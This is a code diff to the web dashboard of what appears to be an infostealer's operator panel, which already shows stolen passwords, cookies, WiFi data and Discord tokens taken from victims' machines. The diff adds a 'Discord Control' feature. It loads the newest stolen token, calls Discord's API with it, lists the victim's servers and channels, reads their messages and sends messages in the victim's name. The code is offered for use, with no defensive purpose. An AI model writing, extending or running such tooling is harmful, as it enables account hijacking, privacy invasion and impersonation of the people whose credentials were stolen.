@@ -260,9 +260,8 @@
     </main>
 
     <main id="tabDiscord" class="tab-content border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl p-5">
-      <h2 class="text-lg font-semibold text-slate-300 mb-4">Discord Tokens</h2>
-      <p class="text-xs text-slate-500 mb-4">Auth tokens extracted from Discord clients. Use <code class="text-emerald-400 bg-slate-800 px-1 rounded">Authorization: Bearer &lt;token&gt;</code> with the <a class="text-emerald-400 hover:underline" href="https://discord.com/developers/docs/reference" target="_blank">Discord REST API</a>.</p>
-      <div class="overflow-x-auto">
+      <h2 class="text-lg font-semibold text-slate-300 mb-4">Discord Control</h2>
+      <div class="overflow-x-auto mb-5">
         <table class="w-full text-left border-collapse">
           <thead>
             <tr class="bg-slate-900/80 border-b border-slate-800 text-xs font-semibold text-slate-400 uppercase tracking-wider">
@@ -276,6 +275,27 @@
             <tr><td class="py-8 px-4 text-center text-slate-500" colspan="4">No Discord tokens found yet<br><span class="text-xs text-slate-600">Agent will check on startup and every 5 minutes</span></td></tr>
           </tbody>
         </table>
+      </div>
+      <div class="flex items-center gap-3 mb-5">
+        <button class="px-4 py-2 text-sm font-medium text-white bg-violet-600 hover:bg-violet-700 rounded-lg border border-violet-500 transition" id="discordServersBtn" onclick="loadDiscordServers()">List Servers</button>
+        <span class="text-xs text-slate-500" id="discordStatus">Select a token first</span>
+      </div>
+      <div class="grid grid-cols-1 lg:grid-cols-3 gap-5">
+        <div class="lg:col-span-1 border border-slate-800 rounded-lg bg-slate-950/50 overflow-hidden">
+          <div class="bg-slate-900/80 px-4 py-2 text-xs font-semibold text-slate-400 uppercase tracking-wider border-b border-slate-800">Servers</div>
+          <div id="discordGuilds" class="p-2 text-sm text-slate-500">Click "List Servers" above</div>
+        </div>
+        <div class="lg:col-span-2 border border-slate-800 rounded-lg bg-slate-950/50 overflow-hidden">
+          <div class="bg-slate-900/80 px-4 py-2 text-xs font-semibold text-slate-400 uppercase tracking-wider border-b border-slate-800 flex justify-between items-center">
+            <span id="discordChannelTitle">Messages</span>
+            <span id="discordChannelInfo" class="text-slate-600 text-xs"></span>
+          </div>
+          <div id="discordMessages" class="p-3 text-sm text-slate-500 max-h-96 overflow-y-auto" style="min-height:200px">Select a channel</div>
+          <div class="border-t border-slate-800 p-3 flex gap-2">
+            <input type="text" id="discordMsgInput" placeholder="Type a message..." class="flex-1 bg-slate-950 border border-slate-800 text-sm rounded-lg px-3 py-2 text-slate-200 placeholder-slate-500 focus:outline-none focus:border-emerald-500 transition" onkeydown="if(event.key==='Enter')sendDiscordMsg()">
+            <button class="px-4 py-2 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition disabled:opacity-50" id="discordSendBtn" onclick="sendDiscordMsg()">Send</button>
+          </div>
+        </div>
       </div>
     </main>
   </div>
@@ -925,6 +945,10 @@ async function fetchWiFi() {
   } catch (e) {}
 }
 
+let g_discordToken = '';
+let g_discordGuildId = '';
+let g_discordChannelId = '';
+
 async function fetchDiscordTokens() {
   try {
     const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/discord_tokens?select=id,created_at,hostname,token&order=created_at.desc&limit=50'));
@@ -933,8 +957,11 @@ async function fetchDiscordTokens() {
     const tbody = document.getElementById('discordBody');
     if (!data || data.length === 0) {
       tbody.innerHTML = '<tr><td class="py-8 px-4 text-center text-slate-500" colspan="4">No Discord tokens found yet<br><span class="text-xs text-slate-600">Agent will check on startup and every 5 minutes</span></td></tr>';
+      document.getElementById('discordStatus').textContent = 'No token available';
       return;
     }
+    const latest = data[0];
+    g_discordToken = latest.token || '';
     tbody.innerHTML = data.map(row => {
       const ts = row.created_at ? new Date(row.created_at.replace(/Z$|[+\-]\d{2}:?\d{2}$/, '') + 'Z').toLocaleString() : '-';
       const host = row.hostname || '-';
@@ -947,7 +974,85 @@ async function fetchDiscordTokens() {
         + '<td class="py-3 px-4 text-xs"><button class="px-2 py-1 text-xs rounded bg-slate-800 hover:bg-slate-700 text-slate-400 border border-slate-700 transition" onclick="navigator.clipboard.writeText(\'' + token.replace(/'/g, "\\'") + '\').then(()=>{this.textContent=\'Copied!\';setTimeout(()=>{this.textContent=\'Copy\'},1500)})">Copy</button></td>'
         + '</tr>';
     }).join('');
+    document.getElementById('discordStatus').textContent = 'Token loaded from ' + (latest.hostname || 'unknown');
   } catch (e) {}
+}
+
+function discordApi(path, method, body) {
+  if (!g_discordToken) { showToast('No token loaded', 'error'); return null; }
+  return fetch('https://discord.com/api/v9' + path, {
+    method: method || 'GET',
+    headers: { 'Authorization': g_discordToken, 'Content-Type': 'application/json' },
+    body: body ? JSON.stringify(body) : undefined
+  }).then(r => r.ok ? r.json() : r.text().then(t => { throw new Error(t); }));
+}
+
+async function loadDiscordServers() {
+  const btn = document.getElementById('discordServersBtn');
+  if (!g_discordToken) { showToast('No token loaded', 'error'); return; }
+  btn.disabled = true; btn.textContent = 'Loading...';
+  document.getElementById('discordStatus').textContent = 'Fetching servers...';
+  try {
+    const guilds = await discordApi('/users/@me/guilds');
+    const container = document.getElementById('discordGuilds');
+    if (!guilds || guilds.length === 0) {
+      container.innerHTML = '<div class="p-2 text-slate-500">No servers found</div>';
+      return;
+    }
+    container.innerHTML = guilds.map(g => '<div class="flex items-center justify-between px-3 py-2 rounded hover:bg-slate-800/50 cursor-pointer transition" onclick="selectGuild(\'' + g.id + '\',\'' + escapeHtml(g.name) + '\')"><span class="text-slate-200 text-sm">' + escapeHtml(g.name) + '</span><span class="text-xs text-slate-500">' + g.id + '</span></div>').join('');
+    document.getElementById('discordStatus').textContent = guilds.length + ' servers loaded';
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); document.getElementById('discordStatus').textContent = 'Error loading servers'; }
+  btn.disabled = false; btn.textContent = 'List Servers';
+}
+
+async function selectGuild(guildId, guildName) {
+  g_discordGuildId = guildId;
+  document.getElementById('discordChannelTitle').textContent = guildName + ' — Channels';
+  document.getElementById('discordChannelInfo').textContent = '';
+  document.getElementById('discordMessages').innerHTML = '<div class="text-slate-500">Loading channels...</div>';
+  try {
+    const channels = await discordApi('/guilds/' + guildId + '/channels');
+    const container = document.getElementById('discordGuilds');
+    container.innerHTML = '<div class="p-2 text-xs text-slate-500 font-semibold">' + escapeHtml(guildName) + '</div>' +
+      channels.filter(c => c.type === 0).map(c => '<div class="flex items-center justify-between px-3 py-1.5 rounded hover:bg-slate-800/50 cursor-pointer transition ml-2" onclick="selectChannel(\'' + c.id + '\',\'' + escapeHtml(c.name) + '\')"><span class="text-slate-300 text-sm"># ' + escapeHtml(c.name) + '</span></div>').join('');
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
+}
+
+async function selectChannel(channelId, channelName) {
+  g_discordChannelId = channelId;
+  document.getElementById('discordChannelTitle').textContent = '# ' + channelName;
+  document.getElementById('discordChannelInfo').textContent = channelId;
+  document.getElementById('discordMessages').innerHTML = '<div class="text-slate-500">Loading messages...</div>';
+  try {
+    const msgs = await discordApi('/channels/' + channelId + '/messages?limit=25');
+    const container = document.getElementById('discordMessages');
+    if (!msgs || msgs.length === 0) { container.innerHTML = '<div class="text-slate-500">No messages</div>'; return; }
+    container.innerHTML = msgs.reverse().map(m => {
+      const author = m.author ? (m.author.global_name || m.author.username) : 'unknown';
+      const time = m.timestamp ? new Date(m.timestamp).toLocaleTimeString() : '';
+      const content = escapeHtml(m.content || '');
+      const attachments = (m.attachments || []).map(a => '<br><a href="' + escapeHtml(a.url) + '" target="_blank" class="text-emerald-400 hover:underline text-xs">[' + escapeHtml(a.filename) + ']</a>').join('');
+      const embeds = m.embeds && m.embeds.length > 0 ? '<br><span class="text-xs text-slate-600">[embed]</span>' : '';
+      return '<div class="py-2 border-b border-slate-800/50 last:border-0"><span class="text-emerald-400 font-medium text-sm">' + escapeHtml(author) + '</span> <span class="text-xs text-slate-600">' + time + '</span><div class="text-slate-200 text-sm mt-0.5">' + content + attachments + embeds + '</div></div>';
+    }).join('');
+    container.scrollTop = container.scrollHeight;
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
+}
+
+async function sendDiscordMsg() {
+  const input = document.getElementById('discordMsgInput');
+  const btn = document.getElementById('discordSendBtn');
+  const text = input.value.trim();
+  if (!text) return;
+  if (!g_discordChannelId) { showToast('Select a channel first', 'error'); return; }
+  btn.disabled = true; btn.textContent = 'Sending...';
+  try {
+    await discordApi('/channels/' + g_discordChannelId + '/messages', 'POST', { content: text });
+    input.value = '';
+    showToast('Message sent', 'success');
+    selectChannel(g_discordChannelId, document.getElementById('discordChannelTitle').textContent.replace('# ', ''));
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
+  btn.disabled = false; btn.textContent = 'Send';
 }
 
 document.getElementById('stopBtn').addEventListener('click', sendStop);
@@ -978,7 +1083,7 @@ window.addEventListener('DOMContentLoaded', () => {
     else if (currentTab === 'passwords') fetchPasswords();
     else if (currentTab === 'cookies') fetchCookies();
     else if (currentTab === 'wifi') fetchWiFi();
-    else if (currentTab === 'discord') fetchDiscordTokens();
+    else if (currentTab === 'discord') { fetchDiscordTokens(); document.getElementById('discordStatus').textContent = g_discordToken ? 'Token loaded' : 'No token'; }
   }, 20000);
   setInterval(tick, 1000);
 });
